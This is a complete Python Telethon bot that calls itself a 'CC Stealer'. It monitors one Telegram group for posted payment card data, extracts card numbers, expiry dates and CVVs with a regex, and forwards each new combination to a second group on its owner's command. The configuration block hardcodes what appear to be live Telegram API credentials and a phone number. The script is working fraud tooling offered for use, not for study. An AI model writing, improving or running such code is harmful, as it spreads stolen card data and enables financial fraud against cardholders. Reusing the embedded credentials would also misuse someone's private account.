from telethon import TelegramClient, events
import re

# ================== CONFIG ==================
API_ID = 25777114
API_HASH = "83d41274e41d8330fc83876fb499432b"
PHONE_NUMBER = "+919908262004"

SOURCE_GROUP = -1002710317388    # Source group where Card messages appear
TARGET_GROUP = -1002882603089    # Target group to forward combos
OWNER_ID = 7835198116
# =============================================

seen = set()
running = False

client = TelegramClient("cc_stealer_cardlabel", API_ID, API_HASH)

# --- Extractor for "Card:" format ---
def extract_combos(text):
    results = []

    # pattern: Card: CC|MM|YY|CVV
    card_pattern = r'Card:\s*(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(card_pattern, text, re.IGNORECASE)

    for ccnum, month, year, cvv in matches:
        month = month.zfill(2)
        year = year[-2:]
        combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
        if combo not in seen:
            seen.add(combo)
            results.append(combo)

    return results

# --- Commands ---
@client.on(events.NewMessage(pattern=r'/start stealer'))
async def start_stealer(event):
    global running
    if event.sender_id != OWNER_ID:
        await event.reply("❌ You are not authorized to run this command.")
        return
    running = True
    await event.reply("✅ Smart Stealer started! Extracting 'Card:' combos now.")

@client.on(events.NewMessage(pattern=r'/stop stealer'))
async def stop_stealer(event):
    global running
    if event.sender_id != OWNER_ID:
        await event.reply("❌ You are not authorized to run this command.")
        return
    running = False
    await event.reply("🛑 Stealer stopped!")

# --- Message handler ---
@client.on(events.NewMessage(chats=SOURCE_GROUP))
async def handler(event):
    global running
    if not running:
        return
    text = event.raw_text
    combos = extract_combos(text)
    for combo in combos:
        await client.send_message(TARGET_GROUP, combo)
        print("Forwarded:", combo)

# --- Main ---
async def main():
    print("Starting Card-label CC Stealer Bot...")
    await client.start(PHONE_NUMBER)
    print("Bot ready. Waiting for /start stealer command...")

with client:
    client.loop.run_until_complete(main())
    client.run_until_disconnected()
